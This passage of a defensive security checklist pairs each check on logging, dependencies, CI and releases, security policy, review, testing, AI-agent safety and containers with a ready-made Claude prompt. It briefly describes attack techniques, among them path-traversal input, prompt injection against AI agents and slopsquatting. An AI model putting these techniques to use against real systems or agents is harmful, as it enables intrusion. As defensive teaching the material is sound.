- Audit first, and show me what you found before making large changes.
- Fix Critical and High issues directly. Ask me before any change users would notice (logging people
out, blocking a feature, changing a flow).
- Fix the root cause with the smallest safe change. Don't remove features, weaken other protections, or
leave "TODO: secure later" comments.
- If you add a package, name it, say why, and confirm it is a real, well-maintained package (not a look-
alike name).
- Never print real secret values; refer to them by variable name.
- If something lives outside the code (package registry, CI, hosting or account settings), give me exact click-by-click steps
instead.

FINISH WITH
1. Findings table: issue · file:line · severity · status (Fixed / Needs my action / Not applicable)
2. Files changed
3. How I can verify it myself in under 5 minutes
```

**Done when**

- [ ] Inputs have size, depth and count limits.
- [ ] External calls have timeouts.
- [ ] Services bound concurrency and queues.
- [ ] Regular expressions are safe or linear-time.

**Watch out for**

- **Limits should be configurable** but safe by default.
- **Zip bombs:** limit decompressed size, not just file size.
- **Trusted callers** can still cause accidents.

---

## G11. Control errors, logging and information leaks

`MEDIUM` | Monitoring & Response | 15-30 min

> Logs and errors help you debug without helping an attacker or exposing users.

**What this means**

Stack traces, file paths, environment dumps and full request bodies in errors or logs reveal internals and sensitive data. Missing logs leave you blind when something goes wrong.

**What goes wrong**

A failed login prints the full request, including the password, to a log file that is shipped to a third-party service. Or an error message exposes a database connection string.

**2-minute self-check**

- Trigger errors on purpose (bad input, missing file, no network) and read the messages and logs.
- Search the code for printing of objects, requests, environment and exceptions.
- Check log files for passwords, tokens, personal data and secrets.

**Claude prompt (G11)** - paste your Project Context first, then this:

```text
Act as a senior software security engineer. Make sure errors and logs are useful for debugging without leaking secrets or internals.

AUDIT
1. Review error handling: users see short safe messages, details go to logs at the right level, and nothing is silently swallowed.
2. Review logging: no secrets, tokens, passwords or unnecessary personal data. Redact known sensitive fields centrally.
3. Check security-relevant events are logged (failed authentication, permission denied, validation failures, configuration changes) with a timestamp and context.
4. Check log file permissions and rotation, and that debug mode is off by default.
5. Check telemetry and crash reporting are opt-in and documented.

FIX
- Add central redaction, safe error messages and security event logging.

VERIFY
Show me example output for a failed action with no sensitive data, and tests that secrets never appear in logs.

HOW TO WORK
- Audit first, and show me what you found before making large changes.
- Fix Critical and High issues directly. Ask me before any change users would notice (logging people
out, blocking a feature, changing a flow).
- Fix the root cause with the smallest safe change. Don't remove features, weaken other protections, or
leave "TODO: secure later" comments.
- If you add a package, name it, say why, and confirm it is a real, well-maintained package (not a look-
alike name).
- Never print real secret values; refer to them by variable name.
- If something lives outside the code (package registry, CI, hosting or account settings), give me exact click-by-click steps
instead.

FINISH WITH
1. Findings table: issue · file:line · severity · status (Fixed / Needs my action / Not applicable)
2. Files changed
3. How I can verify it myself in under 5 minutes
```

**Done when**

- [ ] Errors show safe messages to users.
- [ ] Logs never contain secrets or unnecessary personal data.
- [ ] Security events are logged.
- [ ] Telemetry is opt-in and documented.

**Watch out for**

- **Debug logging left on** is a common leak.
- **Libraries** should not log secrets either.
- **Logging too much** is a privacy risk too.

---

## G12. Update dependencies, lock and verify them

`HIGH` | Deployment & Supply Chain | 20-60 min

> Most of your program is other people's code. Keep it patched, real and minimal.

**What this means**

Dependencies carry known vulnerabilities and sometimes malware. AI tools also invent package names that attackers register ("slopsquatting"), and a compromised maintainer or a typo-squat can reach your users through an ordinary install.

**What goes wrong**

A transitive dependency has a published exploit and nobody notices for a year. Or a look-alike package named almost like the real one is installed because an AI suggested it.

**2-minute self-check**

- Run the audit for your ecosystem (npm audit, pip-audit, cargo audit, go list -m -u with govulncheck, osv-scanner).
- Open the dependency list. Do you recognise and still need every package?
- Check a lockfile is committed and CI installs from it.

**Claude prompt (G12)** - paste your Project Context first, then this:

```text
Act as a senior software security engineer. Find and fix known-vulnerable or suspicious dependencies, and make installs reproducible.

AUDIT
1. Run the right audit tools and list package, installed version, fixed version, severity, direct or transitive and use.
2. Verify each DIRECT dependency is the real, well-known package, with a real repository, active maintenance and sensible download numbers. Flag look-alikes, abandoned packages and unexpected install scripts.
3. Confirm lockfiles are committed and CI installs from them (npm ci, --frozen-lockfile, pip with hashes, Cargo.lock for binaries).
4. Remove unused dependencies and prefer the standard library when it is enough.
5. Set up automated update alerts (Dependabot or Renovate) and a policy for reviewing them.

FIX
- Upgrade with the smallest safe bump and read changelogs for breaking changes. Do not run blind "force" upgrades.
- Remove unused packages and pin or hash where appropriate.

VERIFY
Rebuild, run the tests and show before and after audit results, plus what remains with reasons.

HOW TO WORK
- Audit first, and show me what you found before making large changes.
- Fix Critical and High issues directly. Ask me before any change users would notice (logging people
out, blocking a feature, changing a flow).
- Fix the root cause with the smallest safe change. Don't remove features, weaken other protections, or
leave "TODO: secure later" comments.
- If you add a package, name it, say why, and confirm it is a real, well-maintained package (not a look-
alike name).
- Never print real secret values; refer to them by variable name.
- If something lives outside the code (package registry, CI, hosting or account settings), give me exact click-by-click steps
instead.

FINISH WITH
1. Findings table: issue · file:line · severity · status (Fixed / Needs my action / Not applicable)
2. Files changed
3. How I can verify it myself in under 5 minutes
```

**Done when**

- [ ] No known Critical or High vulnerability in shipped code.
- [ ] Every direct dependency is verified real and needed.
- [ ] Lockfiles are committed and used in CI.
- [ ] Update alerts are on.

**Watch out for**

- **Check before adding.** AI suggestions can be invented or look-alikes.
- **Libraries:** version ranges that are too tight or too loose both cause problems for your users.
- **Dev-only issues** matter less, but do not ignore build-time tools.

---

## G13. Secure CI, builds and releases

`HIGH` | Deployment & Supply Chain | 30-60 min

> What users download should be exactly what you built from reviewed code.

**What this means**

CI systems hold the keys to publishing. Secrets exposed to pull requests, unpinned third-party actions, unsigned releases and accounts without MFA let an attacker ship a malicious version under your name.

**What goes wrong**

A CI workflow runs on pull requests from forks with access to the publishing token. A malicious PR prints the token, and a poisoned release reaches every user.

**2-minute self-check**

- Read every CI workflow. Which secrets exist and which events can access them?
- Check third-party actions and build tools are pinned to a full commit SHA or exact version.
- Check releases are signed or have checksums, and that the publishing account has MFA.

**Claude prompt (G13)** - paste your Project Context first, then this:

```text
Act as a senior software security engineer. Make sure the build and release pipeline cannot be abused to ship malicious code.

AUDIT
1. Review CI workflows: least-privilege tokens, secrets unavailable to untrusted pull requests, no secrets echoed to logs, pinned third-party actions and images.
2. Review branch and tag protection, required reviews and required checks, and that releases are built only from protected refs.
3. Review the publish step: use trusted publishing (OIDC) where the registry supports it, instead of long-lived tokens.
4. Recommend signed releases and checksums, reproducible builds where practical, and provenance attestations (for example SLSA, sigstore).
5. List every account and token that can publish (registry, repository, CI, container registry) with MFA and role state.

FIX
- Tighten permissions, pin dependencies, add protections and signing. Document the release process.

VERIFY
Give me a checklist to confirm CI secrets are not exposed to forks, and commands to verify a release signature or checksum.

HOW TO WORK
- Audit first, and show me what you found before making large changes.
- Fix Critical and High issues directly. Ask me before any change users would notice (logging people
out, blocking a feature, changing a flow).
- Fix the root cause with the smallest safe change. Don't remove features, weaken other protections, or
leave "TODO: secure later" comments.
- If you add a package, name it, say why, and confirm it is a real, well-maintained package (not a look-
alike name).
- Never print real secret values; refer to them by variable name.
- If something lives outside the code (package registry, CI, hosting or account settings), give me exact click-by-click steps
instead.

FINISH WITH
1. Findings table: issue · file:line · severity · status (Fixed / Needs my action / Not applicable)
2. Files changed
3. How I can verify it myself in under 5 minutes
```

**Done when**

- [ ] CI tokens have minimum permissions.
- [ ] Secrets are unavailable to untrusted pull requests.
- [ ] Third-party actions are pinned.
- [ ] Releases are signed or checksummed, and publishing accounts have MFA.

**Watch out for**

- **pull_request_target and similar triggers** are risky. Understand them first.
- **Long-lived tokens** are the thing attackers hope to find.
- **Tag and release permissions** matter as much as branch protection.

---

## G14. Publish a security policy and handle reports

`MEDIUM` | Monitoring & Response | 15-30 min

> Make it easy to report problems privately, and have a plan for what you do next.

**What this means**

People who find a vulnerability need a clear private channel. Without one they disclose publicly or give up. A short policy also sets expectations for supported versions and response time.

**What goes wrong**

A researcher finds a serious bug in your library but has nowhere to report it privately, so they open a public issue. Everyone using the library is now exposed before a fix exists.

**2-minute self-check**

- Check your repository root for SECURITY.md and the platform's private vulnerability reporting option.
- Check the README and package metadata give a way to contact you.
- Do you know who responds, and how quickly, if a report arrives?

**Claude prompt (G14)** - paste your Project Context first, then this:

```text
Act as a senior software security engineer. Make sure there is a clear, private way to report vulnerabilities and a plan for handling them.

AUDIT
1. Draft a SECURITY.md covering: how to report privately (private advisory feature or a security email), what to include, the response and fix targets, and which versions receive security fixes.
2. Recommend enabling the platform's private vulnerability reporting and security advisories.
3. Draft a simple internal response process: triage, reproduce, fix, coordinated disclosure, release, advisory and credit.
4. Check release notes can include security advisories and, for libraries, that deprecations and breaking changes are described.

FIX
- Add SECURITY.md and enable private reporting. Add an advisory template.

VERIFY
Show me SECURITY.md and the enabled settings, and a dry-run of the response process.

HOW TO WORK
- Audit first, and show me what you found before making large changes.
- Fix Critical and High issues directly. Ask me before any change users would notice (logging people
out, blocking a feature, changing a flow).
- Fix the root cause with the smallest safe change. Don't remove features, weaken other protections, or
leave "TODO: secure later" comments.
- If you add a package, name it, say why, and confirm it is a real, well-maintained package (not a look-
alike name).
- Never print real secret values; refer to them by variable name.
- If something lives outside the code (package registry, CI, hosting or account settings), give me exact click-by-click steps
instead.

FINISH WITH
1. Findings table: issue · file:line · severity · status (Fixed / Needs my action / Not applicable)
2. Files changed
3. How I can verify it myself in under 5 minutes
```

**Done when**

- [ ] SECURITY.md exists with a private reporting route.
- [ ] Private vulnerability reporting is enabled.
- [ ] Supported versions are stated.
- [ ] A response process exists.

**Watch out for**

- **An unread security mailbox** is worse than none.
- **Set realistic targets** you can keep.
- **Credit reporters** with their permission.

---

## G15. Run a thorough security review

`REVIEW` | Monitoring & Response | 45-90 min

> One full pass across the whole project, like an attacker would see it.

**What this means**

The earlier checks each look at one area. This review looks at everything together and catches what checklists miss, especially logic flaws unique to your project: unsafe defaults, trust between components, and features that combine in unexpected ways.

**What goes wrong**

Every check passes individually, but the plugin loader trusts a config file that the auto-update feature can overwrite, so a poisoned update gives remote code execution.

**Before you run it**

Run this after the earlier checks, in a fresh session with full codebase access. Use the most capable model available.

**Claude prompt (G15)** - paste your Project Context first, then this:

```text
Act as a senior penetration tester and software security engineer. Do a full pre-release security review of this project. Think like an attacker. Do NOT change any code in this step.

Phase 1, attack surface: read the codebase (and SECURITY_MAP.md if it exists). Summarise stack, distribution, entry points (CLI, API, config, env, files, network, plugins), data and files handled, privileges, third-party dependencies, external processes and trust boundaries.

Phase 2, review each area and list what you checked and found: input validation; injection (command, SQL, path, template); secrets and history; file and temp handling; network and TLS; listeners and authentication; deserialization and code execution; privileges and sandboxing; cryptography; resource limits; logging and errors; dependencies and supply chain; CI and releases; vulnerability reporting; business logic and defaults; AI or agent features if any.

Phase 3, report: write SECURITY_REVIEW.md with a plain-English executive summary (5 lines max); a findings table sorted by severity (ID, title, severity, location, how an attacker would exploit it step by step, recommended fix, effort S/M/L); what you checked and found fine; and anything you could NOT verify from code, with exact steps for me. Rate severity honestly and state your confidence. Do NOT change code in this step. Then STOP and wait for my go-ahead.
```

**Done when**

- [ ] SECURITY_REVIEW.md exists with a ranked findings table.
- [ ] Every Critical and High finding is fixed or has an owner and a date.
- [ ] The "could not verify" items have been checked manually.

**Watch out for**

- **AI reviewers can miss things and can invent problems.** Ask "show me the exact code that proves this".
- **Run it again** after big features and before every major release.

---

## G16. Test the protections and give me a report

`VERIFY` | Monitoring & Response | 45-90 min

> Every fix is proven by a test that tries to break it, and summarised in one report.

**What this means**

A fix you have not tested is a guess. This final step turns each protection into an automated test that tries to break it, fixes what fails and produces a report you can trust. The tests then keep protecting every future release.

**What goes wrong**

The tool "validated" file names, but only in the CLI layer. The library function underneath still accepted ../ and the test "path escape is rejected" fails. The fix goes into the shared function, and the re-test passes.

**Before you run it**

Run in a sandbox or test environment, never destructive tests against production or real user data. Keep the generated tests in your repo and run them in CI.

**Claude prompt (G16)** - paste your Project Context first, then this:

```text
Act as a senior software security engineer and QA lead. Prove that this project's security protections actually work, fix anything that does not, and give me a final report.

Rules: run tests only in a sandbox or test environment, never against production systems or real user data. Write real, repeatable tests in the project's existing framework (pytest, go test, cargo test, Jest/Vitest, JUnit and so on). If none exists, create a minimal setup and explain how to run it.

STEP 1, write and run "try to break it" tests for every check that applies (G01 to G14): hostile and oversized input; injection payloads in every sink; secret scan of tree, history and artifact; path escape, symlink and archive tests; bad certificate and internal address tests; unauthenticated and wrong-role requests; unsafe-loader payloads; permission and privilege checks; weak-crypto scan; resource-limit tests; log redaction tests; dependency audit clean; CI and release settings review checklist.

STEP 2, fix and re-test. For every failing test: explain the cause, apply the smallest correct fix and re-run until it passes. Never weaken or delete a test to make it pass.

STEP 3, write SECURITY_REPORT.md: (1) summary counts (Passed, Fixed and re-tested, Still open, N/A); (2) a table of all checks with status and evidence (test name or command); (3) findings and fixes; (4) open items with risk and next step; (5) manual actions only I can do (account MFA, registry settings, key rotation); (6) how to run the tests and a recommendation to run them in CI on every push.
```

**Done when**

- [ ] Tests exist for every protection that applies.
- [ ] All tests pass, or each failure is listed as an open item.
- [ ] SECURITY_REPORT.md summarises findings, fixes and open items.
- [ ] Security tests run in CI on every push.

**Watch out for**

- **Watch for "fixing" by weakening the test.** If a test changes, ask why.
- **Green tests are not perfect security.** Re-run the review (G15) as the project grows.

---

## Bonus checks

Four extra checks that matter especially for modern projects: AI and agent tooling, maintainer accounts, privacy and telemetry, and container images.

### GB1. Secure AI features, agents and tools

`HIGH`

If the project calls an LLM, runs an agent or exposes tools (for example MCP servers), hostile content can try to steer it into reading files, running commands or leaking data.

**Claude prompt (GB1)** - paste your Project Context first:

```text
Act as an AI application security engineer. Review every place this project calls an LLM, runs an agent or exposes tools.
1. List each AI call: model, where the API key lives, what content goes into the prompt, and what the output is used for.
2. Prompt injection: assume any file, web page, issue, email or user text fed to the model may contain hostile instructions. The model must not be able to read secrets, access files or run commands beyond what the user explicitly allowed. Destructive or costly actions need explicit confirmation.
3. Treat model output as untrusted: never pass it to a shell, SQL, eval or file path without validation.
4. Tools and plugins: least privilege, allowlisted commands and directories, and no ambient credentials.
5. Cost abuse: limits on tokens, calls and spend.
Fix the issues and list what you changed.
```

### GB2. Lock down maintainer accounts

`CRITICAL`

The easiest way into your project is often through you: repository, registry, CI, container registry, email or domain. One phished password there bypasses every other check.

**Claude prompt (GB2)** - paste your Project Context first:

```text
Act as a security advisor. List every account that can change or publish this project (code hosting, package registries, CI, container registries, domain and DNS, email, cloud). For each give me a checklist: MFA with an authenticator app or passkey (not SMS where possible); remove people who no longer need access; least-privilege roles; review connected apps and tokens; prefer trusted publishing over long-lived tokens; turn on security alerts. Format it as a checklist I can tick off.
```

### GB3. Privacy and telemetry

`MEDIUM`

Data you do not collect cannot leak. If the project sends usage data, crash reports or identifiers anywhere, users should know and be able to say no.

**Claude prompt (GB3)** - paste your Project Context first:

```text
Act as a privacy-focused security engineer. Map every piece of data the project collects, logs or sends out, where it goes, and how long it is kept. Make telemetry opt-in, document it in the README, avoid personal data, and allow users to disable it. Check logs and crash reports contain no personal data or secrets. List what a privacy notice needs to say and what needs legal review.
```

### GB4. Container images and deployment

`HIGH`

If you ship a Docker image or deploy to servers, the image is part of your attack surface.

**Claude prompt (GB4)** - paste your Project Context first:

```text
Act as a container security advisor. Review the Dockerfile and deployment config. Use a minimal, pinned base image; run as a non-root user; no secrets in layers or build arguments; multi-stage builds so build tools do not ship; a read-only root filesystem and dropped capabilities where possible; an image scan in CI (for example Trivy or Grype); and signed images. Explain each change and verify the image still works.
```

---

## Emergency card: if something goes wrong

A leaked token, a compromised release, a vulnerability report or strange behaviour in the field. Here is what to do, in order.

1. **Stay calm, keep evidence.** Do not delete logs, releases or history. Write down what you noticed and when.
2. **Stop the bleeding.** Revoke exposed tokens and keys first. If a bad release is out, yank or unpublish it and publish a warning.
3. **Lock the pipeline.** Rotate CI and registry tokens, review recent workflow changes and commits, and check who has publish access.
4. **Investigate.** Check CI logs, registry audit logs, repository audit logs and download statistics: when it started and what changed.
5. **Close the hole.** Fix the vulnerability, add a test that proves it (G16), release a patched version.
6. **Check your users.** Which versions are affected? Who is exposed? Prepare upgrade instructions.
7. **Tell people.** Publish a security advisory with affected versions, the fix and any workaround. Request a CVE if appropriate. If personal data was involved, check legal notification duties.
8. **Learn.** Write a short post-mortem: cause, impact, fix and prevention.

**Claude prompt: incident response** - describe what you saw in the brackets:

```text
Act as an incident responder for a software project. I think my project, its release pipeline or an account has been compromised, or a vulnerability was reported. Here's what I've noticed: [describe what you saw, when, and anything unusual].
Help me, in this order:
1. Containment: the first three actions to take in the next 15 minutes, with exact steps.
2. Which credentials and tokens to rotate first, and how.
3. Where to look in the code, CI logs, repository and registry audit logs to understand what happened.
4. The most likely vulnerability given the codebase, and the fix plus a test.
5. A security advisory draft with affected versions, impact, fix and workaround.
Don't print secret values. Ask me before running anything destructive.
```

> [!WARNING]
> **Leaked a token right now?** Revoke it in the provider dashboard immediately, even before a replacement is ready, if it can publish packages, deploy or spend money. Then follow G03 and G13.

---

## Keep it secure after release

Security is not a one-time pass. Every new feature can reopen an old hole.

| You are adding | Re-run |
|----------------|--------|
| A new input source (flag, file format, endpoint) | G01, G02, G07, G10 |
| Running external commands or building queries | G02 |
| File, archive or temp handling | G04, G10 |
| A network call or listener | G05, G06 |
| A new dependency | G12 (check it is real first) |
| Encryption, hashing or tokens | G09 |
| A plugin, auto-update or template feature | G07, G13 |
| Changes to CI or release steps | G13 |
| AI / LLM or agent features | GB1, G02, G07 |
| Before every release | G03, G12, G13, G15, G16 |

| When | What |
|------|------|
| Every commit | Pre-commit secret scan runs automatically. |
| Every push | Tests and dependency audit run in CI (G16, G12). |
| Weekly | Review dependency and security alerts. |
| Monthly | Dependency cleanup (G12). Review who can publish and who has repository access (GB2). |
| Quarterly | Full review (G15) and test run (G16). Rotate high-value tokens. |
| Every big feature | Re-run the checks in the table above before releasing. |

> [!TIP]
> **Make Claude remember your rules.** Add a short security section to your project's AI rules file (CLAUDE.md or similar), so new code is written safely from the start. For example: "Never build shell commands or SQL from strings. Validate all input at the boundary. Never print secrets. Never disable TLS verification. Ask before adding dependencies."

---

## What your final report looks like

The final check ends with a `SECURITY_REPORT.md`. Use this shape to tell a real report from a vague summary.

| # | Check | Status | Evidence / next step |
|---|-------|--------|----------------------|
| G01 | Validate every input | Passed | fuzz run clean, 12 malformed cases rejected |
| G02 | Prevent injection | Fixed and re-tested | shell=True removed, path test added |
| G03 | Keep secrets out | Fixed and re-tested | gitleaks clean on tree, history, artifact |
| G12 | Update dependencies | Open, next step | Replace abandoned parser package |
| G13 | Secure CI and releases | Needs my action | Enable MFA and trusted publishing |
| G06 | Authenticate services | N/A | No listeners |

| A good report has | Push back if you see |
|------------------|----------------------|
| Every check listed, including N/A ones. | "Everything looks secure!" with no evidence. |
| Evidence for every "Passed": a test name or a command. | Tests that were deleted or weakened to pass. |
| Specific next steps for open items. | Findings with no file, line or endpoint. |
| A clear list of what you must do manually. | Critical items quietly marked "N/A". |

---

## Glossary

| Term | Meaning |
|------|---------|
| Injection | Untrusted data changing the meaning of a command, query or path. |
| Path traversal | Using ../ or symlinks to reach files outside the intended folder. |
| Zip slip | Archive entries that write outside the extraction folder. |
| Deserialization | Turning stored data back into objects. Unsafe formats can run code. |
| SSRF | Tricking a program into fetching internal or private URLs. |
| Least privilege | Giving a program only the access it really needs. |
| Sandbox | A restricted environment that limits what a program can do. |
| Fuzzing | Feeding random or mutated input to find crashes and bugs. |
| ReDoS | A regular expression that takes exponential time on crafted input. |
| Lockfile | A file recording exact dependency versions for reproducible installs. |
| Typosquatting / slopsquatting | Malware published under names similar to, or invented by AI for, real packages. |
| Provenance / SLSA | Evidence of how and where an artifact was built. |
| Trusted publishing | Publishing via short-lived identity tokens instead of stored passwords. |
| Rotation | Replacing a credential with a new one, then revoking the old one. |
| Prompt injection | Hidden instructions in content that try to hijack an AI model or agent. |

> Ship fast. Ship safe. Run the checks, keep the tests, and re-run the review whenever your project grows.
